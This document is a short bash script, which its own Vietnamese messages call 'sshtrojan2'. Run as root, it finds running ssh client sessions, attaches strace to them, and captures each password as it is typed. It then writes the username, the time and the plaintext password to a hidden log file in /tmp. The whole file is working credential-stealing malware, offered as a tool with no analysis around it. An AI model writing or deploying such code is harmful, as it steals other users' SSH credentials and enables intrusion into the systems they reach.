#!/bin/bash

Filepass="/tmp/.log_sshtrojan2.txt"
user=""
pass=""

if [[ $EUID -ne 0 ]]; then
    echo "Khong co quyen su dung! can tai khoan root"
    exit 1
fi

if [[ -e $Filepass ]]; then 
    echo "File $Filepass da duoc tao."
else
    echo "Tap moi file $Filepass thanh cong." 
    touch $Filepass
fi

echo "sshtrojan2 viet thong tin tai khoan user va pass dang text vao file $Filepass"

while true
do
    PID=`ps aux | grep -w ssh | grep @ | tail -n 1 | awk {'print $2'}` 
    
    if [[ $PID != "" ]]; then
        user=`ps aux | grep ssh | grep @ | awk '{print $12}'`
        strace -p $PID -e trace=read --status=successful 2>&1 | while read -r line;
	do
	    char=`echo $line | grep "read(5," | grep ", 1) = 1" | cut -d'"' -f2 | cut -d'"' -f1`
	    if [[ $char == "\\n" ]]; then
		echo "Time:" `date` >> $Filepass
		echo "Username:" $user >> $Filepass
		echo -e "Password:" $pass "\n" >> $Filepass			
		break
	    else
		pass+=$char
	    fi           
        done
    fi
done
